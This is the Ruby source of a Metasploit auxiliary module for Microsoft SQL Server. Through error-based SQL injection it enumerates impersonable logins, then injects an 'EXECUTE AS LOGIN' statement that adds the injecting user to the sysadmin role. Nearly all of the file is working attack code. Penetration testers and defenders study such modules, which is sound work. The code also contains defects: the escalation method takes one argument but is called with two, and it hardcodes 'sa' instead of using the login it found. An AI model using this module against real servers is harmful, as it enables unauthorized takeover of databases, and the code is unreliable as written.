##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/mssql_commands'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL_SQLI
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server SQLi Escalate Execute AS',
      'Description'    => %q{
        This module can be used escalate privileges if the IMPERSONATION privilege has been
        assigned to the user via error based SQL injection.  In most cases, this results in
        additional data access, but in some cases it can be used to gain sysadmin privileges.
        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
      },
      'Author'         => ['nullbind <scott.sutherland[at]netspi.com>'],
      'License'        => MSF_LICENSE,
      'References'     => [['URL','http://msdn.microsoft.com/en-us/library/ms178640.aspx']]
    ))
  end

  def run
    # Get the database user name
    print_status("Grabbing the database user name...")
    db_user = get_username
    if db_user.nil?
      print_error("Unable to grab user name...")
      return
    else
      print_good("Database user: #{db_user}")
    end

    # Grab sysadmin status
    print_status("Checking if #{db_user} is already a sysadmin...")
    admin_status = check_sysadmin

    if admin_status.nil?
      print_error("Couldn't retrieve user status, aborting...")
      return
    elsif admin_status == '1'
      print_error("#{db_user} is already a sysadmin, no escalation needed.")
      return
    else
      print_status("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
    end

    # Get list of users that can be impersonated
    print_status("Enumerating a list of users that can be impersonated...")
    imp_user_list = check_imp_users
    if imp_user_list.nil? || imp_user_list.empty?
      print_error("Sorry, the current user doesnt have permissions to impersonate anyone.")
      return
    else
      # Display list of users that can be impersonated
      print_good("#{imp_user_list.length} users can be impersonated:")
      imp_user_list.each do |dbuser|
        print_status("  #{dbuser}")
      end
    end

    # Check if any of the users that can be impersonated are sysadmins
    print_status("Checking if any of them are sysadmins...")
    imp_user_sysadmin = check_imp_sysadmin(imp_user_list)
    if imp_user_sysadmin.nil?
      print_error("Sorry, none of the users that can be impersonated are sysadmins.")
      return
    end

    # Attempt to escalate to sysadmin
    print_status("Attempting to impersonate #{imp_user_sysadmin}...")
    escalate_privs(imp_user_sysadmin,db_user)

    admin_status = check_sysadmin
    if admin_status && admin_status == '1'
      print_good("Success! #{db_user} is now a sysadmin!")
    else
      print_error("Fail buckets, something went wrong.")
    end
  end

  def get_username
    # Setup query to check for database username
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+SYSTEM_USER+'#{clue_end}')"

    # Run query
    result = mssql_query(sql)

    # Parse result
    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      user_name = $1
    else
      user_name = nil
    end

    user_name
  end

  def check_sysadmin
    # Setup query to check for sysadmin
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin'))as varchar)+'#{clue_end}')"

    # Run query
    result = mssql_query(sql)

    # Parse result
    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      status = $1
    else
      status = nil
    end

    status
  end

  def check_imp_users
    # Setup query to check for trusted databases owned by sysadmins
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))

    # Setup query
    sql = "(select cast((SELECT DISTINCT '#{clue_start}'+b.name+'#{clue_end}'
    FROM  sys.server_permissions a
    INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
    WHERE a.permission_name = 'IMPERSONATE' for xml path('')) as int))"

    # Run query
    res = mssql_query(sql)

    unless res && res.body
      return nil
    end

    #Parse results
    parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)

    if parsed_result && !parsed_result.empty?
      parsed_result.flatten!
      parsed_result.uniq!
    end

    parsed_result
  end

  def check_imp_sysadmin(imp_user_list)
    # Check if the user has the db_owner role is any databases
    imp_user_list.each do |imp_user|
      # Setup query
      clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
      clue_end = Rex::Text.rand_text_alpha(8 + rand(4))

      sql = "(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin','#{imp_user}'))as varchar)+'#{clue_end}')"

      # Run query
      result = mssql_query(sql)

      unless result && result.body
        next
      end

      #Parse results
      parsed_result = result.body.scan(/#{clue_start}(.*?)#{clue_end}/m)

      if parsed_result && !parsed_result.empty?
        parsed_result.flatten!
        parsed_result.uniq!
      end

      # check if user is a sysadmin
      if parsed_result && parsed_result[0] == '1'
        print_good("  #{imp_user} is a sysadmin!")
        return imp_user
      else
        print_status("  #{imp_user} is NOT a sysadmin")
      end
    end

    nil
  end

  # Attempt to escalate privileges
  def escalate_privs(db_user)

    # Setup Query - Impersonate the first sysadmin user on the list
    evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '#{db_user}','sysadmin';Revert;--"

    # Execute Query
    mssql_query(evil_sql)
  end
end
